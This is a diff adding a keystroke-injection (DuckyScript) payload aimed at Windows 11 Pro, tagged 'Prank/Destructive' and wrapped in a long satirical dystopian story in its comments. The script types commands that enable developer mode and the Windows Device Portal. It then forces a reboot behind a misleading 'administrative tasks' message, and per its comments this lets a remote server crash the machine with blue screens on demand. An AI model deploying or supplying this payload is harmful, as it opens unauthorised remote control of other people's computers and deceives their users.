@@ -1,0 +1,39 @@
+REM Title: BSOD as a service
+REM Author: FalsePhilosopher
+REM Target:  Windows 11 pro(must be pro!)
+REM Props: AdityaMitra5102 for creating BAAS https://github.com/AdityaMitra5102/BSOD-as-a-Service and memes/lulz!
+REM Version: 1.0
+REM Category: Prank/Destructive
+REM The year is 2065. You wake up the sound of an Amazon Audiobook ad blaring at twice the volume of a jet engine. Your ears ringing, you pick up your disposable Amazon Echo and smash it on the ground. You'll have to get another one before you come back home. Getting up and rubbing your eyes, you head over to your wardrobe to don your one-time use clothes. You're glad you got such a good deal on your clothes subscription. You head downstairs and go down into the kitchem. You pay 0.000000000225 Bitcoin to ToastCorp to unlock a one-day use of the toaster. You would get the five-day use, as it's a better deal, but you're on a budget right now. You watch as it pops up cocaine-infused toast with Coca-Cola ads burned into it. You then pay 251,255,619,051,585,151 Doge to pour a glass of Basic Plan Tier 1 Sugar Water, a steal. While you eat breakfast, you look at the Disney Weather Channel. More nuclear fallout from the east, Burger King's CEO is using his recreational nukes again. The temperature outside is 150 fahrenheit. You're glad that humans don't contribute to climate change or that would be even higher. As you're about to finish your luxurious breakfast, you start to hear a voice counting down from 60, and machine turrets deploy from your walls. You're spending too long eating breakfast, and Amazon's analytics has determined that you could use some encouragement. Swiftly jumping up from your seat, you grab your self-defence assault rifle and head out the door. After checking for belligerents, you walk to your Ford Armoured Personnel Transport Vehicle 'Explorer'. You pay a measily 0.0000000000000152 etherium to start the engine, then the autopilot takes over. Luckily this vehicle doesn't have a steering wheel, you know that humans are too dumb to transport themselves. You only get into two car crashes on your journey, your car expertly dodges the self-defence turret fire after you damage their private property. You speed down the Proctor & Gamble 20-lane elevated tollways, 125,251 binance is automatically taken from your wallet. It takes you five hours to get from the suburbs to downtown. You can't believe people actually used to live in cities, what peasants. You finally get to the Amazon Grocery Store, and your car drops you off in the two-mile wide mega-capacity parking lot. You remind yourself that the parking lot has to be that big for black fridays, then you give the car a 0.00000001 Dogecoin tip as you get out. As you walk in the door, alarms begin to blare. Machine gun turrets deploy from the walls as you freeze in place. You realise you forgot to smile as you entered. Employees are required to always smile by contract. Then, the worst happens. Your disposable clothes begin to fall apart at the seams. You forgot to check the best-by date, and they are expiring faster than you expected. Fully naked you smile for the emotion detectors and try to casually walk in. You make it to your desk without too much embarrassment, as you are looking through your desk for another package of one-time use clothes your boss comes in and says you're fired for the nudity in the work place and will loose 500 social credit points as well. You ask for a few minutes to put some clothes on and leave with some dignity, under your clothes you see your flipper negative 8 that you waited 4 years to get but was so worth the wait and wonder if HID injection still works on the old machine that the printer hooks up to that runs that old piece of crap operating system windows 11. So get dressed and on the way out fire the laser carrying the HID data from your FZ-8 at the usb port and the machine throws a BSOD as you walk out. But you forgot again to smile as you walk out, the machine gun turrets fill your body with thousands of bullets. As you die laying down on the pavement, your wallet is extracted of all of its coin by desperate bystanders. Your final dying breath is "At least I don't have to pay taxes", before everything goes black.
+REM
+REM Sets up device portal to enable remote BSOD's on demand from your server running the python script or wait till it reboots and hit Win+r to run it again for a self produced BSOD. You need to run it twice for installation. In the first run: It will execute the powershell script which will setup developer mode and restart. In the second run(Make sure you run the S2 PL): It will enable device portal (It cannot be enabled before developer mode is on). You can then run the S2 PL again or call it from your server.
+REM
+REM startup delay
+DELAY 300
+REM Enable developer mode/device portal
+GUI
+DELAY 1000
+STRING Enable Device Portal
+DELAY 2000
+ENTER
+DELAY 4000
+TAB
+DELAY 300
+TAB
+DELAY 300
+TAB
+DELAY 300
+SPACE
+DELAY 2000
+ENTER
+DELAY 2000
+TAB
+DELAY 300
+SPACE
+DELAY 1500
+ENTER
+REM Reboot to enable dev mode/portal
+DELAY 2000
+GUI r
+DELAY 1000
+STRINGLN shutdown -r -f -t 30 -c "Restarting for administrative tasks"
